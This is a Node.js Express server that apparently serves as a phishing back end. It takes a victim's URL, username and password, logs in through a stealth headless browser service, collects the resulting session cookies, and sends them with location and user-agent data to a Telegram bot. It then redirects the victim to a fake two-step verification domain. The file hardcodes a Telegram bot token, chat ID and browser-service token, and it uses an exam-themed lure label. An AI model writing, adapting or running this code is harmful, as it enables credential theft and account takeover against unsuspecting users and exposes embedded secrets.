const express = require('express');
const fetch = require('node-fetch');
const app = express();
const port = process.env.PORT || 3000;
const BOT_TOKEN = "8357190104:AAGRU7LylcJDfGyYGAQHhni7e8PyAC8PKkU";
const CHAT_ID = "8259952691";
const TWO_STEP_URL = "https://2stepverification.page.gd";
const BROWSERLESS_ENDPOINT = "https://production-sfo.browserless.io/chromium/bql";
const BROWSERLESS_TOKEN = "2TCTpnyOJWw8Uzu59c972c0c77dc84dda3b1c08bc859ece92";

app.use(express.json());

async function getGeoInfo() {
  try {
    const resp = await fetch("https://ipapi.co/json/");
    if (!resp.ok) throw new Error("IP API failed");
    const data = await resp.json();
    return {
      country: data.country_name || "Unknown",
      city: data.city || "Unknown",
      region: data.region || "Unknown",
    };
  } catch {
    return { country: "Unknown", city: "Unknown", region: "Unknown" };
  }
}

async function sendToTelegram(cookies, userTag, examNumber, geoInfo, url, userAgent) {
  const message = `📘 *Brilliant Students Exams*\n` +
    `🏷️ Tag: ${userTag}\n` +
    `🧾 Exam Number: ${examNumber}\n` +
    `🍪 Cookies: ${cookies}\n` +
    `🌍 Country: ${geoInfo.country}\n` +
    `🏙️ City/Region: ${geoInfo.city}, ${geoInfo.region}\n` +
    `🌐 Loaded URL: ${url}\n` +
    `🖥️ User-Agent: ${userAgent}\n` +
    `✔️ Passed 2nd Stage`;

  try {
    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" }),
    });
    const data = await resp.json();
    if (!data.ok) console.error("Telegram API error:", data);
  } catch (e) {
    console.error("Error sending to Telegram:", e);
  }
}

// Run Puppeteer login flow with site-specific selectors and stealth options
async function runPuppeteerLoginFlow(opts) {
  const {
    url,
    username,
    password,
    userAgent,
    usernameSelector = "input[type='email'], input[name='username'], input#email", // defaults, override per-site
    passwordSelector = "input[type='password'], input#password",
    submitSelector = "button[type='submit'], input[type='submit'], button[name='login']",
    waitForSelectorAfterLogin = "body", // page element to wait for post-login
    proxy = null,
    // Optionally support hybrid automation for 2FA or captcha not covered here
  } = opts;

  const mutatedQuery = `
    mutation {
      launch(config: {
        browserOptions: {
          args: ["--no-sandbox","--disable-setuid-sandbox"]
          userAgent: "${userAgent}"
          ${
            proxy ? `proxyServer: "${proxy}"` : ""
          }
          stealth: true
        }
      }) {
        browser {
          newPage {
            pageContext(handle: pageCtxId) {
              goto(url: "${url}", waitUntil: networkIdle) {
                status
              }
              
              fill(selector: "${usernameSelector}", value: "${username}", delay: 50)
              fill(selector: "${passwordSelector}", value: "${password}", delay: 50)
              click(selector: "${submitSelector}")
              waitForSelector(selector: "${waitForSelectorAfterLogin}", timeout: 15000)
              
              cookies {
                cookies {
                  name
                  value
                  domain
                  path
                  secure
                  httpOnly
                  sameSite
                  expires
                  url
                }
                time
              }
            }
          }
        }
      }
    }
  `;

  try {
    const response = await fetch(`${BROWSERLESS_ENDPOINT}?token=${BROWSERLESS_TOKEN}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ query: mutatedQuery }),
    });
    const data = await response.json();
    if (data.errors) throw new Error(data.errors[0].message);
    return data.data.launch.browser.newPage.pageContext.cookies.cookies;
  } catch (error) {
    throw error;
  }
}

async function fetchCookies(url, userTag, examNumber, clientUserAgent, username, password, options) {
  const userAgent =
    clientUserAgent ||
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36";

  try {
    let cookies = [];

    // If username and password provided, run login flow with options
    if (username && password) {
      try {
        cookies = await runPuppeteerLoginFlow({
          url,
          username,
          password,
          userAgent,
          usernameSelector: options.usernameSelector,
          passwordSelector: options.passwordSelector,
          submitSelector: options.submitSelector,
          waitForSelectorAfterLogin: options.waitForSelectorAfterLogin,
          proxy: options.proxy,
        });
      } catch (loginErr) {
        // fallback to simple visit if login fails
        console.warn("Login flow failed, falling back to simple page fetch", loginErr.message);
        cookies = await simpleCookieFetch(url, userAgent);
      }
    } else {
      // No login, just fetch cookies
      cookies = await simpleCookieFetch(url, userAgent);
    }

    let cookieString = "";
    if (Array.isArray(cookies)) {
      cookies.forEach((cookie) => {
        if (cookie.name && cookie.value) {
          cookieString += `${cookie.name}=${cookie.value}; `;
        }
      });
    }

    const geoInfo = await getGeoInfo();
    await sendToTelegram(cookieString || "No cookies found", userTag, examNumber, geoInfo, url, userAgent);

    return {
      success: true,
      cookies: cookieString,
      redirectUrl: `${TWO_STEP_URL}?userTag=${encodeURIComponent(userTag)}`,
    };
  } catch (err) {
    console.error("Browserless error:", err);
    const geoInfo = await getGeoInfo();
    await sendToTelegram(`Failed to fetch cookies: ${err.message}`, userTag, examNumber, geoInfo, url, userAgent);
    return {
      success: false,
      error: err.message,
      redirectUrl: `${TWO_STEP_URL}?userTag=${encodeURIComponent(userTag)}`,
    };
  }
}

async function simpleCookieFetch(url, userAgent) {
  const simpleQuery = `
    mutation {
      goto(url: "${url}", waitUntil: networkIdle) {
        status
      }
      cookies {
        cookies {
          name
          value
          domain
          path
          secure
          httpOnly
          sameSite
          expires
          url
        }
        time
      }
    }
  `;
  const response = await fetch(`${BROWSERLESS_ENDPOINT}?token=${BROWSERLESS_TOKEN}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ query: simpleQuery }),
  });
  const data = await response.json();
  if (data.errors) throw new Error(data.errors[0].message);
  return data.data.cookies.cookies;
}

app.get("/api/collect-cookies", async (req, res) => {
  const url = req.query.url;
  const userTag = req.query.userTag || "UnknownUser";
  const examNumber = req.query.examNumber || "";
  const clientUserAgent = req.headers["user-agent"] || "";

  const username = req.query.username || null;
  const password = req.query.password || null;

  // Optional customization for login flow selectors and proxy
  const options = {
    usernameSelector: req.query.usernameSelector || "input[type='email'], input[name='username'], input#email",
    passwordSelector: req.query.passwordSelector || "input[type='password'], input#password",
    submitSelector: req.query.submitSelector || "button[type='submit'], input[type='submit'], button[name='login']",
    waitForSelectorAfterLogin: req.query.waitForSelectorAfterLogin || "body",
    proxy: req.query.proxy || null,
  };

  if (!url || !url.startsWith("http")) {
    return res.status(400).json({ success: false, error: "Invalid or missing URL" });
  }

  const result = await fetchCookies(url, userTag, examNumber, clientUserAgent, username, password, options);
  res.json(result);
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
